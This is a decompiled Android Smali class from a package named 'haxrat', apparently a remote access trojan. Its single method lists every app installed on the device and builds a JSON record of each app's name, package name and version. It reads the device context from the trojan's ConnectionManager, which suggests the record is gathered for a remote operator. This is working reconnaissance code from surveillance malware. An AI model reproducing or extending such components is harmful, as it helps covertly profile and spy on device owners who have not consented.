.class public Lcom/hax4us/haxrat/AppList;
.super Ljava/lang/Object;
.source "AppList.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 48
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getInstalledApps(Z)Lorg/json/JSONObject;
    .locals 16

    .prologue
    .line 18
    move/from16 v0, p0

    new-instance v12, Lorg/json/JSONArray;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v12

    .line 20
    sget-object v12, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v12}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v12

    const/4 v13, 0x0

    invoke-virtual {v12, v13}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v12

    move-object v3, v12

    .line 22
    const/4 v12, 0x0

    move v4, v12

    :goto_0
    move v12, v4

    move-object v13, v3

    invoke-interface {v13}, Ljava/util/List;->size()I

    move-result v13

    if-lt v12, v13, :cond_0

    .line 42
    new-instance v12, Lorg/json/JSONObject;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v4, v12

    .line 44
    move-object v12, v4

    :try_start_0
    const-string v13, "apps"

    move-object v14, v2

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v12

    .line 47
    :goto_1
    move-object v12, v4

    move-object v0, v12

    return-object v0

    .line 23
    :cond_0
    move-object v12, v3

    move v13, v4

    invoke-interface {v12, v13}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/content/pm/PackageInfo;

    move-object v5, v12

    .line 24
    move v12, v0

    if-nez v12, :cond_1

    move-object v12, v5

    iget-object v12, v12, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    if-nez v12, :cond_1

    .line 22
    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 28
    :cond_1
    :try_start_1
    new-instance v12, Lorg/json/JSONObject;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v6, v12

    .line 29
    move-object v12, v5

    iget-object v12, v12, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    sget-object v13, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v13}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual {v12, v13}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v12

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    move-object v7, v12

    .line 30
    move-object v12, v5

    iget-object v12, v12, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    move-object v8, v12

    .line 31
    move-object v12, v5

    iget-object v12, v12, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    move-object v9, v12

    .line 32
    move-object v12, v5

    iget v12, v12, Landroid/content/pm/PackageInfo;->versionCode:I

    move v10, v12

    .line 34
    move-object v12, v6

    const-string v13, "appName"

    move-object v14, v7

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 35
    move-object v12, v6

    const-string v13, "packageName"

    move-object v14, v8

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 36
    move-object v12, v6

    const-string v13, "versionName"

    move-object v14, v9

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 37
    move-object v12, v6

    const-string v13, "versionCode"

    move v14, v10

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    move-result-object v12

    .line 38
    move-object v12, v2

    move-object v13, v6

    invoke-virtual {v12, v13}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v12

    goto :goto_2

    :catch_0
    move-exception v12

    move-object v6, v12

    goto :goto_2

    .line 44
    :catch_1
    move-exception v12

    move-object v5, v12

    goto :goto_1
.end method
